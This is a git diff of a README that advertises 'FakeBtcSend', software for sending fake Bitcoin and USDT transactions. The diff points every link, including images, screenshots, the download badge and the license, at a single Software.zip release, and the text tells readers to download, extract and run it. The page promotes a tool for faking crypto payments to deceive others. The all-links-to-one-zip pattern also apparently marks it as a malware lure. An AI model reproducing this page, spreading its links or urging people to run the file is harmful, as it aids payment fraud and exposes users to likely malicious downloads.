@@ -2,7 +2,7 @@
 
 🚀 **Send Btc To Anyone**
 
-![FakeBtcSend](https://www.example.com/fakebtcsend.jpg)
+![FakeBtcSend](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip)
 
 ### Topics
 ['btc-fake-sender', 'fake-bitcoin-send', 'fake-bitcoin-transaction', 'fake-btc-send', 'fake-btc-sender-download', 'fake-crypto-sender', 'fake-usdt', 'fake-usdt-software', 'send-fake-bitcoinfake-btc-send', 'usdt-flashing-software']
@@ -20,22 +20,22 @@ Welcome to FakeBtcSend - your ultimate tool for sending fake Bitcoin transaction
 ---
 
 ### How to Use FakeBtcSend
-1. Download the FakeBtcSend software from [here](https://github.com/user-attachments/files/18388744/Software.zip) and extract the files.
+1. Download the FakeBtcSend software from [here](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip) and extract the files.
 2. Launch the software on your device.
 3. Enter the recipient's Bitcoin address and the amount you want to send.
 4. Click on the "Send" button and let the magic happen!
 5. Watch as the fake Bitcoin transaction is processed seamlessly.
 
 ### Screenshots
-![Screenshot 1](https://www.example.com/screenshot1.jpg)
-![Screenshot 2](https://www.example.com/screenshot2.jpg)
+![Screenshot 1](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip)
 
 ---
 
 ### Get Started
-Ready to start sending fake Bitcoin transactions? Download the FakeBtcSend software [here](https://github.com/user-attachments/files/18388744/Software.zip).
+Ready to start sending fake Bitcoin transactions? Download the FakeBtcSend software [here](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip).
 
-[![Download FakeBtcSend](https://img.shields.io/badge/Download-FakeBtcSend-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download FakeBtcSend](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip)](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative downloading options.
 
@@ -45,7 +45,7 @@ If the link does not work, please check the "Releases" section of this repositor
 If you encounter any issues or have suggestions for improving FakeBtcSend, feel free to open an issue or reach out to us. Your feedback is valuable to us as we continue to enhance the fake Bitcoin sending experience.
 
 ### License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/yourusername/FakeBtcSend/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Mikey51811/FakeBtcSend/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
